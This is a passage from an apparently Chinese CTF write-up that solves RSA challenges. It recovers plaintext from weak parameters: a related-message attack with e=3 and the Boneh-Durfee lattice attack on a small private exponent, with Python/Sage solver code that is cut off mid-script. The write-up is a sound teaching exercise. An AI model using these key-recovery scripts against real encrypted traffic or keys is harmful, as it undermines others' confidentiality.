n2=0xc31344c753e25135d5eed8febaa57dd7020b503a5569bdd4ae6747b5c36436dc1c4d7ead77bfc1034748bcc630636bae1c8f4ca5dee8246b3d6f3e8b14e16487733b14ec8e587e07a7a6de45859d32d241eaf7746c45ff404f1a767ab77e8493ae8141fee0bcf4e9b7c455415b6945fa60de928b01dfa90bbf0d09194f93db7a1663121d281c908f0e38237f63c2b856f99c6029d993f9afb5fbbb762044d97943ff34023486c4cf1db9ffdc439d9f5ff331b606374c7133d61e4614fac3ea7faaf54563338b736282658e7925b224577091831351a28679a8d6f8e7ba16685b2769bb49b79f8054b29c809d68aca0f2c5e3f1fd0e3ef6c21f756e3c44a40439</span><span class="token comment" spellcheck="true"># # e2=0x10001</span><span class="token comment" spellcheck="true"># # c2=0xbefa7d62f15cafc81d098fdd524411537e948d83266ef22848f44d2e43d1f1388a26bb21c8fb08b571c7cbd6630d6f2b409c85c68a6419e472941e4978f60b93e1ce850344dbe99f1918cb5b8c35075bbdca82fa233d1300f108e4b75ce10d7b0ffa145bceffbc7a5204bf9c119f77af191091f25140aedcdd333b631b240ddad3108c96084dffe6e49e04880908fa02c02edb58e2f27919d707151adb6787384ca28050f8d77418cc1733187d7695f57127be8d6174562723679ba39790d7f2306271b9d8f4d2bdde9ed798af00074ec7da3a7f1ffeb4fc6a61804e51c0f92d384dc62b80fd44492588af26ac0185a23f86c46a7ffdec9fcf31b02b08b63001</span><span class="token comment" spellcheck="true"># print "p -> {}".format(gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q1 -> {}".format(n1 / gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q2 -> {}".format(n2 / gcd(n1, n2))</span>q <span class="token operator">=</span> <span class="token number">161993393900030566867150602363721535479433489542726899362944130872107225598993516228193877689420023695231584876954537089973673478074348422697619820309397363583748523503035462772765277978491082324620122838540365168604124924805412323471486221429513024367107238770298040268787441768635257727315317704741778501737</span>p1 <span class="token operator">=</span> <span class="token number">92392842076088454558676873885205432277688794102622657192126179753576488966439636785821047115301443362169549898465575056742381428321997570097374526363913597739756884031644135343404225885226264566916462715686341654211514913366341960827374747754358972050549971216117165750261475461979495685882564817634194301271</span>p2 <span class="token operator">=</span> <span class="token number">90279376687119715076904357810855212347782022402759254635072438787841245581930716927541800564582197695494423401147385731042364986596482750220701857807271816829238846312998439918616452075752787878425283820635199121653984306111110530896331011530772771558835563313746863033189248831495407320154948117671577602867</span><span class="token comment" spellcheck="true">#p=getPrime(1024)</span><span class="token comment" spellcheck="true">#q=getPrime(1024)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p1<span class="token operator">*</span>qc <span class="token operator">=</span> <span class="token number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">3966878437245643631637564975732704690837306124446086877872976205025646385675581853511438558449272831057566720069483322716185302889500282616707242022434828280064159692586323031389171478503753908040157812124377949328353938367107704570961998942943251122002994862593199357765354157601632561816952286250637771656438228389552713018311110406430345367091645709437632368795499521650765928713846948596775009799649123556193038678824282362527557831582015129491351042998117090300454963836491928898672785463727735926420386710315758459309854603319606229977802586942578329763497502143858265135463947731426008988290087504887177240673</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><h2 id="❎Challenge-5"><a href="#❎Challenge-5" class="headerlink" title="❎Challenge 5"></a>❎Challenge 5</h2><p>已知n和两个cipher，并且是由m和m+1加密而来。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">5</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>x<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</code></pre><p>通过化简得到 <code>计算公式： (m+1)^3 - m^3 = c2-c1 ==&gt; (3m^2+3m+1)加减k*n=c2-c1</code></p><p>一元二次方程求根：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190529105312.png" alt=""></p><p>此时只需求符合条件的k值即可。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token comment" spellcheck="true"># 求一元二次方程根</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93Lc1<span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cLc2<span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eLe<span class="token operator">=</span><span class="token number">3</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true"># 3m^2+3m+1=c2-c1</span><span class="token comment" spellcheck="true"># ▲ = 9-4*3*(1-c2+c1)</span><span class="token comment" spellcheck="true"># x = (-b[+-](▲)^0.5)/(2*a)==>可以知道x为m，即为整数</span><span class="token comment" spellcheck="true"># c = 1-c2+c1-(k*n)</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>n<span class="token operator">*</span>k<span class="token operator">+</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(c)</span>    delta <span class="token operator">=</span> <span class="token number">9</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span>c    <span class="token comment" spellcheck="true">#print(delta)</span>    <span class="token keyword">if</span> delta<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#print(iroot(delta,2)[1])</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>delta<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    m<span class="token operator">=</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">6</span> <span class="token comment" spellcheck="true">#求根</span>                    <span class="token keyword">if</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c1<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#i = 17时符合条件</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    k <span class="token operator">+=</span> <span class="token number">1</span></code></pre><h2 id="❎Challenge-6"><a href="#❎Challenge-6" class="headerlink" title="❎Challenge 6"></a>❎Challenge 6</h2><p>Boneh and Durfee attack.（当d的bits数小于n的一定程度时，可采用此攻击。题中出现了<code>d=random.getrandbits(1024*0.270)</code>）</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hex<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Config</span><span class="token comment" spellcheck="true">##########################################</span><span class="token triple-quoted-string string">"""Setting debug to true will display more informationsabout the lattice, the bounds, the vectors..."""</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token triple-quoted-string string">"""Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`"""</span>strict <span class="token operator">=</span> <span class="token boolean">False</span><span class="token triple-quoted-string string">"""This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it"""</span>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment" spellcheck="true"># stop removing if lattice reaches that dimension</span><span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Functions</span><span class="token comment" spellcheck="true">##########################################</span><span class="token comment" spellcheck="true"># display stats on helpful vectors</span><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span>    nothelpful <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span> nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span><span class="token comment" spellcheck="true"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a<span class="token comment" spellcheck="true"># tries to remove unhelpful vectors</span><span class="token comment" spellcheck="true"># we start at current = n-1 (last vector)</span><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># end of our recursive function</span>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span>        <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># we start by checking from the end</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># if it is unhelpful:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span>            <span class="token comment" spellcheck="true"># let's check if it affects other vectors</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># if another vector is affected:</span>                <span class="token comment" spellcheck="true"># we increase the count</span>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span>                    affected_vector_index <span class="token operator">=</span> jj            <span class="token comment" spellcheck="true"># level:0</span>            <span class="token comment" spellcheck="true"># if no other vectors end up affected</span>            <span class="token comment" spellcheck="true"># we remove it</span>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> BB            <span class="token comment" spellcheck="true"># level:1</span>            <span class="token comment" spellcheck="true"># if just one was affected we check</span>            <span class="token comment" spellcheck="true"># if it is affecting someone else</span>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># if it is affecting even one vector</span>                    <span class="token comment" spellcheck="true"># we give up on this one</span>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment" spellcheck="true"># remove both it if no other vector was affected and</span>                <span class="token comment" spellcheck="true"># this helpful vector is not helpful enough</span>                <span class="token comment" spellcheck="true"># compared to our unhelpful one</span>                <span class="token keyword">if</span> affected_deeper <span class="token operator">and</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># nothing happened</span>    <span class="token keyword">return</span> BB<span class="token triple-quoted-string string">""" Returns:* 0,0   if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`"""</span><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Boneh and Durfee revisited by Herrmann and May    finds a solution if:    * d &lt; N^delta    * |x| &lt; e^delta    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    """</span>    <span class="token comment" spellcheck="true"># substitution (Herrman and May)</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># u = xy + 1</span>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>    UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true"># x-shifts</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># x-shifts list of monomials</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomial <span class="token operator">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># y-shifts (selected by Herrman and May)</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># substitution</span>    <span class="token comment" spellcheck="true"># y-shifts list of monomials</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span 